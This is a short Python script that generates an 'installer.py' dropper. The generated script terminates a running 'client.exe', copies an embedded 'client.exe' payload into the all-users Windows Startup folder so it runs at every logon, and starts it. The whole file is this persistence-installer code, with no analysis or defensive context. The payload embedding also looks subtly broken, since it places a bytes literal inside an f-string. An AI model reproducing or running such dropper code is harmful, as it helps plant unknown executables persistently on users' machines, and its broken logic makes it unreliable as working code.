script=f"""import time,os,psutil
if __name__=='__main__':
    try:
        for process in psutil.process_iter():
            if process.name()=="client.exe":
                process.terminate()
        startup_path="C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/client.exe"
        payload={open("client.exe","rb").read()}
        open(startup_path,"wb").write(payload)
        print("Installed")
        os.startfile("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/client.exe")
        print("Started")
    except Exception as e:
        print(e)
    finally:
        time.sleep(10)
"""

open("installer.py","w").write(script)